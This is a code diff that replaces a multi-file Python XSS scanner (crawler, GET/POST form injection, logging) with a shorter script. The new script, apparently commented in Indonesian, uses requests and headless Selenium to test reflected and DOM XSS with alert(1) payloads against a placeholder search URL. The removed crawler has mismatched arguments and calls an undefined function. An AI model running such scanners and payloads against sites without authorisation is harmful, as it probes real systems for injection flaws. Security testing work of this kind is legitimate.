@@ -1,179 +1,49 @@
-pwnxss.py
-import argparse
-from core import Core
-from crawler import Crawler
-from log import Log
-
-def start():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-u", help="Target URL")
-    parser.add_argument("--depth", default=2, type=int, help="Crawl depth")
-    parser.add_argument("--method", default=2, type=int, help="Method (0: GET, 1: POST, 2: GET and POST)")
-    parser.add_argument("--proxy", default=None, help="Proxy settings")
-    parser.add_argument("--cookie", default='{"ID":"1094200543"}', help="Cookies")
-    args = parser.parse_args()
-
-    if args.u:
-        Core.scan(args.u, args.proxy, {"User-Agent": "Mozilla/5.0"}, args.cookie, args.method)
-        Crawler.crawl(args.u, args.depth, args.proxy, {"User-Agent": "Mozilla/5.0"}, args.method, args.cookie)
-    else:
-        Log.info("Please provide a target URL with -u")
-
-if __name__ == "__main__":
-    start()
-
-
-
-core.py
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode
-from random import randint
-from helper import session
-from log import Log
-
-class Core:
-    @classmethod
-    def load_payloads(cls, filename):
-        with open(filename, 'r') as file:
-            return [line.strip() for line in file.readlines()]
-
-    @classmethod
-    def generate_payload(cls):
-        payloads = cls.load_payloads('payload1.txt')
-        return "<script>" + payloads[randint(0, len(payloads)-1)] + "</script>"
-
-    @classmethod
-    def scan(cls, url, proxy, headers, cookie, method=2):
-        cls.payload = cls.generate_payload()
-        cls.url = url
-        cls.session = session(proxy, headers, cookie)
-        Log.info(f"Checking connection to: {url}")
-        try:
-            response = cls.session.get(url)
-            cls.body = response.text
-        except Exception as e:
-            Log.high(f"Internal error: {str(e)}")
-            return
-
-        if response.status_code > 400:
-            Log.info(f"Connection failed with status {response.status_code}")
-            return
-        else:
-            Log.info(f"Connection established with status {response.status_code}")
-
-        if method >= 2:
-            cls.check_post_method()
-            cls.check_get_method()
-        elif method == 1:
-            cls.check_post_method()
-        elif method == 0:
-            cls.check_get_method()
-
-    @classmethod
-    def check_post_method(cls):
-        soup = BeautifulSoup(cls.body, "html.parser")
-        forms = soup.find_all("form", method=True)
-
-        for form in forms:
-            action = form.get("action", cls.url)
-            if form["method"].lower().strip() == "post":
-                Log.warning(f"Target has form with POST method: {urljoin(cls.url, action)}")
-                keys = {input["name"]: cls.payload for input in form.find_all(["input", "textarea"]) if input.get("name")}
-                Log.info(f"Sending payload (POST) method to {urljoin(cls.url, action)}")
-                response = cls.session.post(urljoin(cls.url, action), data=keys)
-                if cls.payload in response.text:
-                    Log.high(f"Detected XSS (POST) at {urljoin(cls.url, action)}")
-                else:
-                    Log.info("Payload not executed via POST method.")
-
-    @classmethod
-    def check_get_method(cls):
-        soup = BeautifulSoup(cls.body, "html.parser")
-        links = soup.find_all("a", href=True)
-        for link in links:
-            url = link["href"]
-            if "?" in url:
-                query = urlparse(url).query
-                query_payload = urlencode({k: cls.payload for k in parse_qs(query)})
-                test_url = url.replace(query, query_payload)
-                Log.info(f"Testing payload (GET) at {test_url}")
-                response = cls.session.get(test_url)
-                if cls.payload in response.text:
-                    Log.high(f"Detected XSS (GET) at {test_url}")
-                else:
-                    Log.info("Payload not executed via GET method.")
-
-
-
-log.py
-from datetime import datetime
-
-class Log:
-    @classmethod
-    def info(cls, text):
-        print(f"[INFO] {datetime.now().strftime('%H:%M:%S')} - {text}")
-    
-    @classmethod
-    def warning(cls, text):
-        print(f"[WARNING] {datetime.now().strftime('%H:%M:%S')} - {text}")
-    
-    @classmethod
-    def high(cls, text):
-        print(f"[CRITICAL] {datetime.now().strftime('%H:%M:%S')} - {text}")
-
-
-
-helper.py
-import requests, json
-
-def session(proxies, headers, cookie):
-    r = requests.Session()
-    r.proxies = proxies
-    r.headers = headers
-    r.cookies.update(json.loads(cookie))
-    return r
-
-
-
-crawler.py
 import requests
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-from multiprocessing import Process
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+import time
 
-class Crawler:
-    visited = []
+# URL target dan payload XSS
+target_url = "http://example.com/search"
+xss_payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)', "' onerror='alert(1)"]
 
-    @classmethod
-    def get_links(cls, base, proxy, headers, cookie):
-        lst = []
-        conn = session(proxy, headers, cookie)
-        text = conn.get(base).text
-        isi = BeautifulSoup(text, "html.parser")
+# Fungsi untuk memeriksa reflected XSS
+def check_reflected_xss(url, payload):
+    params = {'q': payload}
+    response = requests.get(url, params=params)
+    
+    if payload in response.text:
+        print(f"Reflected XSS ditemukan dengan payload: {payload}")
+    else:
+        print(f"Reflected XSS tidak ditemukan dengan payload: {payload}")
 
-        for obj in isi.find_all("a", href=True):
-            url = obj["href"]
+# Fungsi untuk memeriksa DOM-based XSS
+def check_dom_xss(url, payload):
+    chrome_options = Options()
+    chrome_options.add_argument("--headless")  # Jalankan browser dalam mode headless
+    driver = webdriver.Chrome(options=chrome_options)
 
-            if urljoin(base, url) in cls.visited:
-                continue
-            elif url.startswith("mailto:") or url.startswith("javascript:"):
-                continue
-            elif url.startswith(base) or "://" not in url:
-                lst.append(urljoin(base, url))
-                cls.visited.append(urljoin(base, url))
-            
-        return lst
-
-    @classmethod
-    def crawl(cls, base, depth, proxy, headers, level, method, cookie):
-        urls = cls.get_links(base, proxy, headers, cookie)
+    try:
+        driver.get(url)
+        search_box = driver.find_element(By.NAME, 'q')
+        search_box.send_keys(payload)
+        search_box.send_keys(Keys.RETURN)
+        time.sleep(3)  # Tunggu beberapa detik untuk memastikan halaman telah dimuat sepenuhnya
         
-        for url in urls:
-            if url.startswith("https://") or url.startswith("http://"):
-                p = Process(target=core.main, args=(url, proxy, headers, level, cookie, method))
-                p.start()
-                p.join()
-                if depth != 0:
-                    cls.crawl(url, depth-1, proxy, headers, level, method, cookie)
-                else:
-                    break
+        # Periksa apakah payload dieksekusi di DOM
+        if payload in driver.page_source:
+            print(f"DOM-based XSS ditemukan dengan payload: {payload}")
+        else:
+            print(f"DOM-based XSS tidak ditemukan dengan payload: {payload}")
+    finally:
+        driver.quit()
+
+# Memindai XSS dengan payload yang diberikan
+for payload in xss_payloads:
+    print(f"Memindai dengan payload: {payload}")
+    check_reflected_xss(target_url, payload)
+    check_dom_xss(target_url, payload)
